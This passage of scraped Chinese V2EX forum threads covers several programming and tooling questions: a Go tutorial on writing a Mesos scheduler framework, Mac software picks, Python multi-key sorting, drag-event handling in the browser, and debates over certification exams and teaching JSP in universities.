JPA 2.0 Criteria API ）。\r", "\r", "\r", "\r", "以前写过一些 Spring Data 操作支持， ", "自定义接口扩展： ", " Specifcation 是有一套标准，但是投影，表连接这些操作可以吗？", "对于复杂的 sql 怎么处理，比如说业务需要关联 3 张表"]},
{"content": ["<div class=\"topic_content\">应该能满足大部分人的基本需求\r<br>地址:\r<br>&gt; <a target=\"_blank\" href=\"http://jimxu.me/2016/08/16/mac%20software%20list/\" rel=\"nofollow\">http://jimxu.me/2016/08/16/mac%20software%20list/</a>\r<br>\r<br>有更好的软件欢迎补充</div>"], "reply": "27", "tittle": "分享下本人精挑细选的 mac 软件列表，每款软件均有打分", "comment": [" \r", "\r", "\r", " \r", "\r", "\r", " ", "dash 太贵了，用 ", " ，就是没有 java", "猜猜我是谁。。。。", "dash 淘宝才几块...我买的 dash3 还可以升级 dash4...", " 看了下 devdocs 也是蛮好用的 我回头加到我的收藏列表里 只是 dash 还支持多款编辑器的插件", " dash 太贵了，不想折腾破解，升级太频繁了，穷有穷的用法", "dash 免费版和收费版功能是一样的，只是作者建议付费，支持下作者。。。", " 求指点，哪里买的？谢谢！", " 正价买的 DASH ，绝对值", " 推荐使用 Cyberduck 小黄鸭代替 Filezilla", " 是导入 license 的那种吗？", "Dash 的话，学生可以邮件过去要 Education Discount", " 要钱吗？\r", "\r", "目前觉得 Filezilla 还不错", " 对我来说挺贵的，而且这个软件升级太频繁了，实在付不起", "你们都是把 dock 放在左边👈的么", " 免费的，官网有免费版。要支持作者的话，可以上 AppStore 购买，也可以捐助。", " #8 打开文档不倒数 10 秒了吗？", "用的最多的是 youku", "补充个 typroa 和 U 图床\r", "\r", "另外求个 RSS 阅读器，最好免费", "播放器我现在只用 IINA", " 不会的。我就第一次打开文档有 10s cd ，后面就没了", " typora\r", "\r", "文件上传用 transmit 谁用谁知道", " 收费的 Reeder ，免费的 Leaf(限免，我刚才看 appstore 里还是免费的)", "之前一直用的免费 dash ，每次都要等好几秒，太烦了，直接原价购买……", " 不的不说 这个 U 图床很好用！！", " 我看到还是 68 元。。。 Leaf 之前也关注过，不知道什么时候还会再限免\r", "\r", "\r", " 我是直接放在 iCloud 里，这样手机和电脑都可以用，分享话直接导出 html 放在七牛里\r", "\r", "\r", " 确实，就是每次更新还得重新配置一次，其他的无话可说"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"\" src=\"https://i.v2ex.co/2g7E67V5l.jpeg\"></p>\n<p>“调度”这个词近两年被提到的比较多，资源调度管理应用生命周期等，带来了极大的便利，<a href=\"www.shurenyun.com\" rel=\"nofollow\">数人云</a>开源的 Mesos 调度器 Swan ，基于 Mesos 实现应用调度框架，帮助用户轻松发布应用，实现应用的滚动更新，并根据用户指定的策略做应用的健康检测和故障转移。</p>\n<p>授之以鱼不如授之以渔，小数带来工程师的代码级文章，透彻分析如何写 Mesos Framework ：</p>\n<ul>\n<li>\n<p>注册 (见上篇文章后半部分 <a href=\"http://mp.weixin.qq.com/s/5SuaHVN4Azot-chRp4EO-w\" rel=\"nofollow\">《吾家 Swan 初长成|数人云 Mesos 开源调度器》</a>）</p>\n</li>\n<li>\n<p>运行任务</p>\n</li>\n<li>\n<p>Task 状态更新</p>\n</li>\n<li>\n<p>删除任务</p>\n</li>\n<li>\n<p>Mesos 断线重连</p>\n</li>\n</ul>\n<h2>运行任务</h2>\n<p>当我们接受到 Mesos 发来的 offer 以后，可以选择接受或拒绝 offer 。如果要运行任务，那么就 Accept offer,  否则的话应该 decline offer 。代码示例如下：</p>\n<pre><code>   \n    for _, offer := range offers {\n                cpus, mem, disk := OfferedResources(offer)\n                var tasks []*mesos.TaskInfo\n                for taskLaunched &lt; tasksCount &amp;&amp;\n                        cpus &gt;= NeededCpus &amp;&amp;\n                        mem &gt;= NeededMem &amp;&amp;`\n                        disk &gt;= NeededDisk {\n                        task, err := BuildTask(offer) \n                        if err != nil {\n                                return fmt.Errorf(\"Build task failed: %s\", err.Error())`\n                        }   \n \n         \n                        taskInfo := BuildTaskInfo(offer, task)\n                        tasks = append(tasks, taskInfo)\n \n                         taskLaunched++\n                        cpus -= version.Cpus\n                        mem -= version.Mem\n                        disk -= version.Disk\n                 ｝\n                 LaunchTasks(offer, tasks)\n      }  \n</code></pre>\n<p>OfferedResources(offer) 用来计算 offer 提供的资源，包括 cpu, memory 和 disk 的大小. BuildTaskInfo 用来构造一个 mesos 所识别的 TaskInfo 结构体， LaunchTasks 用来给 Mesos 发命令以创建 task 。 LauchTasks 的过程实际上是一个接受 Mesos offer 的过程，示例代码如下：</p>\n<pre><code>        logrus.Infof(\"Launch %d tasks with offer %s\", len(tasks), *offer.GetId().Value)\n        call := &amp;sched.Call{\n                FrameworkId: s.framework.GetId(),\n                Type:        sched.Call_ACCEPT.Enum(),\n                Accept: &amp;sched.Call_Accept{\n                        OfferIds: []*mesos.OfferID{\n                                offer.GetId(),\n                        },\n                        Operations: []*mesos.Offer_Operation{\n                                &amp;mesos.Offer_Operation{\n                                        Type: mesos.Offer_Operation_LAUNCH.Enum(),\n                                        Launch: &amp;mesos.Offer_Operation_Launch{\n                                                TaskInfos: tasks,\n                                        },\n                                },\n                        },\n                        Filters: &amp;mesos.Filters{RefuseSeconds: proto.Float64(1)},\n                },\n        }\n \n        return s.send(call)\n</code></pre>\n<p>之后，如果创建 tasks 成功的话，应该就可以在 Mesos ui 上看到刚才创建的 task 了。</p>\n<h2>Task 状态更新</h2>\n<p>Task 状态是通过 Mesos statusUpdate 事件来更新的。 Mesos task 状态大概分以下几种：</p>\n<pre><code>TaskState_TASK_STARTING TaskState = 0\nTaskState_TASK_RUNNING  TaskState = 1\nTaskState_TASK_KILLING  TaskState = 8\nTaskState_TASK_FINISHED TaskState = 2\nTaskState_TASK_FAILED   TaskState = 3\nTaskState_TASK_KILLED   TaskState = 4\nTaskState_TASK_ERROR    TaskState = 7\nTaskState_TASK_LOST TaskState = 5\nTaskState_TASK_DROPPED TaskState = 9\nTaskState_TASK_UNREACHABLE TaskState = 10 \nTaskState_TASK_GONE TaskState = 11 \nTaskState_TASK_GONE_BY_OPERATOR TaskState = 12 \nTaskState_TASK_UNKNOWN TaskState = 13}}}\n\n \n更新状态的示例代码如下：\n \n\nfunc (s *Scheduler) status(status *mesos.TaskStatus) {\n    state := status.GetState()\n    taskId := status.TaskId.GetValue()\n    switch state {\n        case mesos.TaskState_TASK_STAGING:\n             doSometing()                  \n        case mesos.TaskState_TASK_STARTING:\n             doSometing()                 \n        case mesos.TaskState_TASK_RUNNING:\n             doSometing()\n        case mesos.TaskState_TASK_FINISHED:\n             doSometing()                \n        case mesos.TaskState_TASK_FAILED:\n             doSometing()                \n        case mesos.TaskState_TASK_KILLED:\n             doSometing()                \n        case mesos.TaskState_TASK_LOST:\n             doSometing()\n    }\n</code></pre>\n<p>上面只是示例代码，具体的处理细节可以看 <a href=\"https://github.com/Dataman-Cloud/swan\" rel=\"nofollow\">https://github.com/Dataman-Cloud/swan</a>。</p>\n<h2>删除任务</h2>\n<p>删除任务是通过给 Mesos 发送 Call_KILL 类型的消息来实现的，消息中指定了需要杀死的 task 的 ID ，具体示例代码如下：</p>\n<pre><code>        call := &amp;sched.Call{\n                FrameworkId: s.framework.GetId(),\n                Type:        sched.Call_KILL.Enum(),\n                Kill: &amp;sched.Call_Kill{\n                        TaskId: &amp;mesos.TaskID{\n                                Value: proto.String(task.ID),\n                        },  \n                        AgentId: &amp;mesos.AgentID{\n                                Value: task.AgentId,\n                        },  \n                },  \n        }   \n \n        duration := proto.Int64(task.KillPolicy.Duration * 1000 * 1000)\n        if task.KillPolicy != nil {\n                if task.KillPolicy.Duration != 0 {\n                        call.Kill.KillPolicy = &amp;mesos.KillPolicy{\n                                GracePeriod: &amp;mesos.DurationInfo{\n                                        Nanoseconds: duration,\n                                },  \n                        }   \n                }   \n        }   \n \n        return s.send(call)\n</code></pre>\n<p>其中， Type 类型指定了消息的类型， FrameworkId 指定了当前 Framework 在 Mesos 注册的 ID ， <a href=\"http://task.ID\" rel=\"nofollow\">task.ID</a> 指定了需要 kill 的 task 的 ID ， task.AgentId 指定了需要 kill 的 task 所在的 agentId.</p>\n<p>killPolicy 是一个自定义的优雅终止相关的策略，其中指定了优雅终止的超时时间 duration,也就是 Mesos 先給 task 发一个 SIGTERM 的信号，让 task 有时间去做一些清理工作，如果 task 没有正常终止，在经过一定时间后发送 SIGKILL 去强制杀死 task 。这个时间由 duration 指定， Mesos 默认是 3 秒。</p>\n<h2>Mesos 断线重连</h2>\n<p>Framework 和 Mesos 之间通过一个长连接进行通信，在某些情况下，连接可能出错，这时候就需要 Framework 重新去连接 Mesos,示例代码如下：</p>\n<pre><code>    logrus.Infof(\"Subscribe with mesos master %s\", s.Master)\n    call := &amp;sched.Call{\n        Type: sched.Call_SUBSCRIBE.Enum(),\n        Subscribe: &amp;sched.Call_Subscribe{\n            FrameworkInfo: s.Framework,\n        },\n    }\n \n    if s.Framework.Id != nil {\n        call.FrameworkId = &amp;mesos.FrameworkID{\n            Value: proto.String(s.Framework.Id.GetValue()),\n        }\n    }\n \n    resp, err := s.Send(call)\n    if err != nil {\n        return err\n    }\n \n    // http might now be the default transport in future release\n    if resp.StatusCode != http.StatusOK {\n        return fmt.Errorf(\"Subscribe with unexpected response status: %d\", resp.StatusCode)\n    }\n \n    go s.handleEvents(resp)\n \n    return nil\n}\n \nfunc (s *Scheduler) resubscribe() {\n    for {\n        logrus.Warn(\"Connection to mesos got error, reconnect\")\n        if err := s.subscribe(); err == nil {\n            return\n        } else {\n            logrus.Errorf(\"%s\", err.Error())\n        }\n        &lt;-time.After(2 * time.Second)\n    }\n}\n \nfunc (s *Scheuler) handleEvents(resp *http.Response) {\n    defer func() {\n        resp.Body.Close()\n    }()\n \n    r := NewReader(resp.Body)\n    dec := json.NewDecoder(r)\n \n    for {\n        event := new(sched.Event)\n        if err := dec.Decode(event); err != nil {    //got some error, reconnect.\n        go func() {\n            s.resubscribe()\n        }()\n \n        return\n        }\n \n        switch event.GetType() {\n            case sched.Event_SUBSCRIBED:\n                doSomework()\n            case sched.Event_OFFERS:\n                doSomework()\n            case sched.Event_RESCIND:\n                doSomework()\n            case sched.Event_UPDATE:\n                doSomework()\n            case sched.Event_MESSAGE:\n                doSomework()\n            case sched.Event_FAILURE:\n                doSomework()\n            case sched.Event_ERROR:\n                doSomework()\n            case sched.Event_HEARTBEAT:\n                doSomework()\n            }\n        }\n    }\n</code></pre>\n<p>函数 resubscribe 用来向 Mesos 重新注册，如果注册失败，隔 2 秒之后会重试，直到连接成功为止。注册成功后会在一个新的 goroutine 里继续原来逻辑的处理。具体可以查看 Mesos 文档(<a href=\"http://mesos.apache.org/documentation/latest/scheduler-http-api\" rel=\"nofollow\">http://mesos.apache.org/documentation/latest/scheduler-http-api</a>)的 Disconnections 小节关于重连的内容。</p>\n<p>五步走的 Mesos Framework 教程就分享到这里了，更多代码请跳转<a href=\"https://github.com/Dataman-Cloud/swan\" rel=\"nofollow\">https://github.com/Dataman-Cloud/swan</a>，欢迎 Star&amp;Fork 。</p>\n</div></div>"], "reply": "3", "tittle": "一言不合秀代码 | 怎样写好 Mesos Framework", "comment": ["一言不合就打广告....", "缩进有 4 格有 8 格，对不起，你是好人。", " 小编不是很懂代码缩进，可能复制过来的时候有问题，~~~~(>_<)~~~~"]},
{"content": "", "reply": "4", "tittle": "windows 上有什么 pdf 文件转成 html 文件的工具吗？", "comment": ["Adobe Acrobat", "  谢谢， 我去试试", "pandoc ， windows WSL"]},
{"content": ["<div class=\"topic_content\">学校是重庆的渣本。一舍友考 c 语言计算机二级，两次都没过，而且我们都是学计算机的。我们系的学霸，年级第一也参加考计算机二级。真是搞不懂是怎么想的！看了很多公司招聘，也么有要求计算机二级和四级的。各位 V 友你们考了吗？对比怎么看？最后再叹息一句，在三本里，想学到技术，只能靠自己学。</div>"], "reply": "136", "tittle": "计算机二级和四级，在面试的时候有用吗？看到我们系学霸也在考。", "comment": ["那年考 2 级。。编程 帮 前后左右的都做了。。结果理论考试挂了。。", "要 2 ， 4 级的都是事业单位，国企。并且不是这个行业的。\r", "2 ， 4 级能力说白了就是幼儿园水平，你觉得这行有人看么。", "好像没有。", "你还不如考软考 软件设计、数据库之类的，虽然也没有什么用。", "所谓有用肯定是有用，有些国企和事业单位会要，不能因为你学计算机你想搞计算机这个行业，你就觉得你周围的人都必须当程序员才是正道，别人考这个就瞧不上别人，要我说现在的程序员大多都有这个心理问题。你技术厉害，你想学技术，别人只想考好成绩，安安心心的回家考个事业单位。借刘慈欣的一句话来说就是：所有的生活都是合理的，我们没有必要互相理解。", "“而且我们都是学计算机的”本科毕业证就相当于四级吧，考啥。\r", "谁要是来面试简历上写计算机二级，直接挂。\r", "\r", "有这个闲功夫还不如把英语 6 级过了。", "考不考计算机二级 and 是否在简历上写计算机二级\r", "是一回事吗？\r", "\r", "-- 随便考一下就过了，干嘛不考？\r", "-- 面试官不喜欢，干嘛要写？\r", "\r", "面试官喜不喜欢看到写有 “计算机二级证” 的简历，是他们的事\r", "你考不考试，是你自己的事\r", "你要不要在简历上写明 计算机二级，是你自己的事\r", "\r", "3 个事 互不相干 没毛病 \r", "考过了之后大不了可以不写在简历上嘛 ）\r", "\r", "我会骑马射箭开飞机 难道还都要写在简历上？\r", "\r", "-", "不知道现在二级四级都考什么了。如果是二级 C 语言和三级的汇编话考下还挺好的。二级可以巩固下 C 语言基础（一堆诡异的题），三级汇编可以让你对系统底层运行有个初步了解，对后面自学黑客破解和操作系统原理很有帮助。", "这个啊，小学就有同学说要去考，好像他初中没毕业就过 2 级了吧", "考个 RHCE + CCIE 或许还有用。。", "1.首先看学校学院对这个 CCT 有没有要求，和学位证毕业证挂钩的话，那你必须得考啦。\r", "2.还有一个 计算机技术与软件专业技术资格（水平）考试 ，这个有专业类别，你自己了解下，考个这个也可以。\r", "3.那还有像 RHCE 这个红帽认证等等，不行你自学个 ", " 这类的，可以有认证证书的。\r", "\r", "从感兴趣的地方，试试发展下去。", "不如写个循环来的实在。", "证书是给那些没有实力的人 放简历上的。\r", "搞计算机 真的不需要证书。", "面试时拿这个说话一句话不用说直接走人", "非计算机专业，二级 C （备考一周左右）、四级网络工程师（第一次复习了一晚上，挂了；第二次复习了一晚上加一个白天，过了）都考了，闲着无聊的时候刷成就而已。。反正到现在除了简历上能写写，其他的还没发现有啥用", "在任何地方学技术都是靠自己", "据我那时候的经验（非计算机专业），但凡会操作电脑日常的，再会点 word ， excel ， PowerPoint ，二级准过；\r", "简单学点三脚猫的编程，比 hello world 复杂点的，四级也就过了；\r", "还是不要说出来的好吧...  ...", "学霸考说不定只是为了多个证拿奖学金？", "在任何地方学技术都是靠自己+1", "既然都是渣本。。就可以说话了😂\r", "一呢，没必要跟风\r", "二呢，确实有可能为了奖学金加分\r", "三呢，人家就是想试试", "四级能过的话，考二级干嘛？", "对于计算机专业的人没用，对非计算机专业的人有用，对非计算机专业面试计算机技术类工作无用。\r", "\r", "你要是计算机专业的可以考点别的证，比这个有含金量多了。你说考了又没坏处，那还不如平时上课好好学，绩点考高一些就行了。", "西安渣本\r", "如果你不打算进入企事业单位那就没必要考了，而且不如去考软考，我不清楚计算机等级考试的证书有什么用，但是软考考出来是职称，在企事业单位里面有用\r", "\r", "怎么说？很多学校大四时候会组织一次校内考试，给大家发学位证\r", "\r", "话说考软考网工时候碰到了计算机网络老师~结果他还没过 2333", "不是我吹呀, 计算机二级我初二暑假就考过了", "不如写个红黑树来的实在", "不如考个思科认证", "技多不压身，不过其实都不算一技", "说实话，那些简历上写着计算机二级的，你让他现场写个打印九九乘法表他都未必会。", "没考过 也没用到过", "没什么软用，大学时候就为了加点创新分，拿奖学金去考了一下，二级和四级都是一遍过，中间还考了软考和系统分析师", "不吹,和计算机不搭嘎的专业裸考过计算机三级", "所以说学校限定了眼界", "软件工程专业毕业自带 4 级证书_(:з」∠)_（考这些还不如考国家注册高级证和各产品认证： OCM 、 CCIE 等", "V 友不是人均 985 吗 ", " ", "这东西是给外行用的\r", "不过作为本专业的居然考不过，充分说明你们按文科方法来学习的", "useless, PS ： 软考也没用。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>突然想知道有没有什么简短的方法，在性能不是主要问题的时候</p>\n<p>百度了一下好像有个 DSU 能用一下</p>\n</div></div>"], "reply": "15", "tittle": "Python 排序，第一个 key 降序，如果相同，第二个 key 升序，这种是不是只能硬写？", "comment": ["想优雅而不考虑性能可以 sort 两次\r", "第一次随意 sort\r", "第二次 stable_sort", "好像说， pandas 多好。", "sorted 里面的 key 参数不能处理这个问题吗？", "活用 cmp 参数就行了，不需要两次\r", "python3 可以用 cmptokey 转换\r", "\r", "或者直接 key=(key1, -key2)仅限于 key 是数字的情况\r", "\r", "rtfm", "sorted(lst, key = lambda x: (x[0], -x[1])) 不就行了", "sorted(cmp=)不是有这个可以传函数进去吗？", "66666 各种方式 学到了", "python 都支持用方法排序了，想怎么样都可以啊", "前几天才在知乎上看到这个利用 sort 的 key 来实现多种排序方法的语法糖示例， ", " ヽ(✿ﾟ▽ﾟ)ノ", "为什么会有人把这个当成语法糖。", " 估计是参考其他语言的设计来说的，比如 C#就有很多语法糖", " 这不叫语法糖……… C++也是这样的啊", "曾用过的一个方法，好像并不简短，但每次要用的时候都会拿来用，方便\r", "\r", " 这是个锤子的语法糖啊。\r", "\r", "你觉得这个是语法糖吗。\r", "\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>求助，如题</p>\n</div></div>"], "reply": "4", "tittle": "sublime text 3 怎样转跳到文件最后一行", "comment": ["window ctrl + end\r", "mac  cmd + ↓", "开 vi 模式，在 normal 状态下 G", " @", " 可以用！！！感谢分享", "我一向是 全选+右方向键。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>百度 ife2017 里面有这么一道题，实现一个图片裁剪器。</p>\n<p>传送门 <a href=\"http://ife.baidu.com/course/detail/id/37\" rel=\"nofollow\">http://ife.baidu.com/course/detail/id/37</a></p>\n<p>我的疑问是关于这个裁剪框。</p>\n<h1>我的需求：</h1>\n<p>这个裁剪框是拖拽生成出来的，可以通过边框上的点拖拽改变高度和宽度，可以移动。</p>\n<h1>我的思路：</h1>\n<p>自然是绑定相应相应的事件。 mousedown ， mousemove ， mouseup 。</p>\n<ol>\n<li>拖拽框的父元素应该绑定三个事件 down ， move ， up 。没毛病。\n2.拖拽框自身也要绑定事件，同上。\n3.拖拽框上的调整点也要绑定事件吧，因为要通过拖动改变大小\n3.都使用事件冒泡</li>\n</ol>\n<h1>问题：</h1>\n<ol>\n<li>然后我发现写的 function Clipper(){}里面有一大坨 element.addEventListener()，这个应该怎么写才优雅？</li>\n<li>然后我上 github 上看看类似的代码，发现有一些是把 move 和 up 事件都绑定到 document ， down 事件绑定到元素上。这样做应该会有优化？</li>\n<li>还有，绑定完的事件在 mouseup 的时候是不是要移除掉？</li>\n<li>我还看到有人把 move 这个事件嵌套到 down 事件的回调函数里面，这样写是正确的吗，这样写，是不是因为出于要 down 了才能 move 这个原因？绑定事件还要看时机？</li>\n</ol>\n<p>暂时不考虑 H5 的 drag and drop</p>\n<p>所以应该怎么样写才好？</p>\n<p>谢谢大家 : )</p>\n</div></div>"], "reply": "3", "tittle": "前端自定义拖拽如何封装鼠标事件?", "comment": ["Clipper 是我封装的图片裁剪器", "拖拽的思路都是 mousedown 绑在要拖的元素上，触发时在 document 上绑定 mousemove 和 mouseup ， up 时注销 document 上的事件，这样保证不会鼠标动太快移出元素事件丢失\r", "另外 ie 有 setCapture 功能， ff 有类似的，自己搜吧", " 好的 thx"]},
{"content": ["<div class=\"topic_content\">刚大三的弟弟问我个 jsp 的 bug ，已经 2017 年了，我觉得 jsp 应该是彻底走下舞台了。我上大学那会也是 jsp 还有什么 jstl 。个人感觉 javaee 大学里可以多讲 servlet ，应用方向就 spring mvc ，像 jsp 我觉得基本没必要费时间去教的，当成是 javaee 的一个发展过程提一提就可以了......大学本来认真学的人就少，然后课程设置的技术偏老，会导致很多大学生大四找工作还专门交钱去培训学校，不然找不到工作......感觉大学的作用应该是给学生打基础，然后在应用方面提供一个未来的方向，不然大学生一看招聘要求会怀疑人生的吧</div>", "<div class=\"topic_content\">看了下回复，可能标题起得比较引战。。。我认为教 jsp 是没有问题的，我只是觉得不应该花很多课时去教。大学教基础，但在引导学生基础应用方面也有责任，大学虽然不是培训学校，但是大部分大学生的首要目标还是就业，站在很多非名牌大学的学生角度看，他们面试的时候可能觉得还比不上一个培训学校的有优势，觉得大学白读了。。。比如现在很多学生大四了还专门去培训学校培训几个月，不然找不到工作，这种现象我觉得学生要反思自己，大学也同样应该反思自己课程是否合理。这就是我的观点，无意引战， 更没有看不起 jsp 的意思...标题的锅。。</div>"], "reply": "87", "tittle": "现在大学 javaee 还在教 jsp 啊", "comment": ["大学还在教 asp 的都有 - -", "javaee 在东北某 985 叫软构件与中间件，确实还在讲，而且还有 jsf 什么的，倒是框架什么的分配的时间不多", "那不是 c 也不需要了？\r", "学校讲的是基础，框架之类的自学就好", "不教 jsp 教啥？ freemarker 和 velocity 一般都是给前端写了", "还有 vba 的呢。😰", " 也还在教 webform", "大学又不是职业学校，根本就不应该教这个", "是啊 上学期刚学的...", "教 jsp 和教 C 完全不是一码事，而且 jsp,java 什么的根本不应该出现在大学课程里面，撑死给 java 一个学期的时间，就这都嫌多", "前一阵看到同学发微博。\r", "老师在用 eclipse 讲，模拟器用 android2.2", "大学里就不该教 j2ee ，甚至 Java 都不用教，光教汇编和 C++就够了，最多加一门 lisp ，其它语言都应该自学", "上学期安卓课，机房电脑配置 Core2 Duo ，集显， 2G 内存， Eclpise + ADB\r", "打开模拟器已经过去了半个小时 (ˉ▽ˉ；)...\r", "\r", "这学期 Unity3D 课，机房电脑配置 2.2Ghz 的不知道什么牌子的 CPU ，集显， 2G 内存\r", "根本打不开 Unity3D  /(ㄒoㄒ)/~~", "写页面不用 jsp 用啥？", "jsp 是 Servlet API 以及 J2EE 的基础组成部分之一\r", "就算最新的 Servlet 4.0 尚且没有 deprecated JSP API\r", "教学基础内容有什么问题吗？", "大四党 表示我们大三上学了 JSP 大三下学了 ASP  然后还是专业必修课… 然后大三上用 JSP 写的课程设计用 ASP 又重写了一遍……然后一个月后我发现 JSP 跟 ASP 都不会了！ (嗯", "是的，我们这现在还在教 jsp ， el 表达式和 jstl 标签库，隔壁.net 方向还在学 webform 。前端方面学校还在学 jquery ， jquery-mobile 和 easyui 。", "我们这还算好的了。别的地方的朋友跟我说他们还在教 flash 和用 dw 写网页。", "万一学校老师就只会 jsp,servlet 呢？你说 Spring 是不是很尴尬。。", "是的，大二表示还在 jsp", "Servlet 的 doService 里接到请求，从 Model 取到数据填到 ServletRequest 的 attribute 里，再 forward 给 jsp ， jsp 从 request 的 attribute 取数据填入页面，这样就足够能把 MVC 讲明白。\r", "请问讲 jsp 到底有什么问题？你说的 spring mvc 有比这个高明在哪里么？", "jsp 都不用讲了， servlet 和 spring 这些让他们稀里糊涂的东西就更不用提了，除非是选修课，随便怎么折腾", "大学教的东西很多都落后于时代啊", " i hate dw", "嗯。比如 GWT", "最近在学 servlet ，也一直在疑惑现在 java web 的使用还有多少。看完上面的回复，更加困惑…这是前端很少再使用 jsp ？", " 是的，还经常运行不起来，于是调试时当做课件", "我们学校普遍 Tomcat + MyEclipse + SSH 全家桶。做后端的六七成都是这个配置，剩下的大多数是 PHP （纯手撸，或者 Think PHP 之类的国产框架居多）。 Python Go 之流的我好像就没见过。\r", "\r", "校内这两年上线的网站也基本都是 Java （ PHP 都不算火）。\r", "\r", "教务系统据说是用 Scala 真是一股清流（但还是一样的不稳定）（而且他们权限设置的特严格，很多功能都打不开）。", "看这个帖子，以为穿越了...", "没读书了开始的  那是 19 岁,没读书的时候是 18 岁,说真的,在读书那会儿编程这种东西对自己来说就是一种高不可攀的,也一直觉得计算机领域和生物学领域属于高科技领域!我这种不爱学习的渣渣的想都不敢想的,后来没读书了发现自己什么都不会啊 ,接触了销售,靠业绩发工资那种!但在在这个生活被互联网一网打尽的时代,销售也离不开网络的.打算学习网络营销,在学习网络营销首先学习的是的 html,开始学的时候自己连<>在哪里都找不到,跑去加了一个群问,告诉我的那个人说我还是小白.那是我人生中第一次巧代码,连左右尖夸号都找不到,现在我承认我那时是小白中的小小白!现在不一样了..渐渐的从不知道到认识代码再到会编写代码..但是网络营销并没有学完...自学活跃网上找各种资料.后来接触到了一个黑客论坛...了解到了网络安全的 后来已发不可收拾了...就慢慢的了解后数据库后端的编程语言,及操作系统...到 http 协议等等...中途看过好多书也看过好多视屏教程...html 是第一学的 linux 是第二...渐渐的..安全是离不开编程的...所有学了编程了..现在的职业规划一打算了..信息安全只作为一个爱好去研究..编程才是硬功夫..将来希望自己是架构师方向... 不管怎么说...先巧两年的代码....", "所以 lz 是不是被问到，然后回答不上，进而恼羞……🤓", "大学这种课教什么不关键，毕竟应用类的东西教得再新也赶不上，稳定入门就可以了。", "基础还是很重要的呀兄弟  spring 系列只是编程的工具", "大学还教这？", " 这么多年过去了，你应该先学习一下写文字的时候添加标点符号以及适当排版", " 那你就错了，职校现在都不教 JSP 的，： p 滑稽", "这有什么，我前两天大学还在教 foxpro 和 VB 呢。其实理解 J2EE 的演进还是有价值的，一个 servlet 的没搞懂的人你让他用 spring?", "渣二本表示学校大二下教过 jsp 还是请的印度外教。 ", " 这个学期在学，不过我打算听了。 j2e 会在大四实训的时候学。", "有什么不好的麼，，，，", "JSP+Servlet 算是过渡吧，虽然确实很恶心。\r", "PS: 可能局限于小环境，感觉无论大学教什么，都还是要自学。只靠外力是学不好的。", " 敢不敢说出是哪家 985", "上来直接就教框架吗？这样基础不太好吧。", " 牛逼的学校，教学资源差异太大了，完全不是一个级别，穷二本的我只能被教 asp ，不过我也学 Java 就是。\r", "\r", " 前端可以动态访问后台接口，返回数据对网页进行更新，这个没什么难得， jsp 我感觉了解就好，重点继续学 Servlet 进而 spring 。\r", "\r", "入门教教 jsp ，能怎么玩动态就好了，就算 Servlet+spring 我感觉压力太大了，现在的学生差异太大了，不能走会的人教，必须保证每个学生能尽力听懂，课下又不看书，就看上课那么点时间怎么学会？反正说白了，该自学自学。另外老师可以适时穿插点做后台的理念让学生对后台有所概念，这样我感觉挺不错了。\r", "\r", "还是想感叹教学资源差异真大。老师到现在还是一如既往讲十几年前的技术，别的学校早就跨出去了。", " NIIT?", "对的，我们现在就在上，而且还是必修课🤢", "没毛病，传统的 servlet api 这种演进路程还是要有的，没有走直接跑毕竟不好，要体验下升级的过程与好处。", "感觉教什么不重要，但是教练一点卵用都没有的东西就是学校的不对了，😂", "大学就应该教基础的东西，流行的框架应该自己学。或者去培训班。", " 不是", " 一看就知道 是有运营经验的银....", "PHP 是世……", " 要知道，在我这里，一个班 5 个宿舍。被我和另外一个舍友全带去 node.js 和 python 了。 只有一个写 java 的。哈哈哈", " #44 即使是 springboot 依旧是 j2ee 规范下的产物，难道 springboot 默认使用 tomcat 已经脱离了 servlet 规范？", "jsp 都不懂你还想飞？", " \r", "有些老的项目，我维护起来就是这么做的，\r", "spring mvc ， flask+jinja 也是这样的\r", "不过的确实践起来没有现在新的框架维护起来简洁。", "工作多年我还在写 jsp", "jsp 感觉还能忍。毕竟是基础。。。。 EJB ？ JSF ？？？？？", "叫啥都不重要啦，都是了解编程，入个门，我觉得大部分语言都能干这个，但是也却有优劣之分，指望着大学（一般本科）教的东西去干活还是有点不够", "培训机构也还教 jsp 呢，毕竟基础，如果面试的时候一问连 jsp 都不知道，显得没有经验，其他框架可以再学", " 说 spring-xxx 是 javaee 规范下的产物我就笑了。你去了解点 spring 的演进路线就知道 spring 从来都是跟 javaee 正面刚的。\r", "spring-boot 内置 servlet 容器了是没错，但你看 spring 的事务是怎么做的？基于 jta 了吗？ Propagation 这个 annotation 的 package name 是 javax 开头的吗？", "一方面, 上一代的高龄 java 码农空出的企业项目总要有新生力量去填坑... 高龄 j2ee 哪个不是从 jsp 写过来的? 现在这批人, 要么急流勇退, 要么升级全职后端搞性能去了, 要么换语言 /工种了. 底层 jsp 谁来写? 当然还是广大的初级 j2ee 码农, jsp 是低端就业的一个手段.\r", "\r", "另一方面, 大学讲师很多一部分也就是混口饭, 不教学生 jsp 直接来 js 和 json 多出来多少工作量啊\r", "\r", "实用主义, jsp 又不是不能用, 老图新用, 年轻人意会一蛤\r", "\r", "请先去了解 jsp 和 servlet 的关系！\r", "\r", "再去看看现在公司里的项目多少用 jsp 的", "另外老夫也很奇怪, jsp 和 servlet 不是 spring 全家桶的基础么, 不教这个直接来 springMVC 之类的框架不是扯淡吗...", "大学的一些技术都是滞后的", "谁能提一下用 jsp 有什么问题？", " #58  Java 下 做后端，除非你自己从头搞一套，否则哪个框架（出名点的）哪个玩意 是不需要用 J2EE 的一部分规范，诚然一些 J2EE 的像 EJB 等玩意已经死透了， spring 后续的版本不还是打脸的支持了 JPA JTA 等规范", " 写纯后端不需要用到 JSP 啊", " #61 springmvc 实际上 一直在竭力去掉 servlet 规范的影子，模板引擎又不止 JSP 一家  ，还有其它各种各样的渲染方法，不过现在一般都是前后端解耦了， 分开开发 好处还是 显而易见的", "看看楼主这说法，我最近在看的培训班视频就是 js jq servlet jsp ajax 然后才是框架。即使教了 jsp ，培训班的基础也不扎实。倘若你不教，不敢想象", "个人觉得大学最应该教的是  c 和 python", "会学的同学会把学 jsp 用到的技巧运用到学习其他语言上，大学不是教会什么，而是教会如何学习。等大学毕业了遇到新东西懂得如何学。", "大学里就没有明确过教的是 javaee 吧 jsp 一般都是实验项目", "都是大前端年代了\r", "jsp+servlet 自己写个单一入口配合 filter 一样做网站\r", "又不像以前 jstl 满天飞 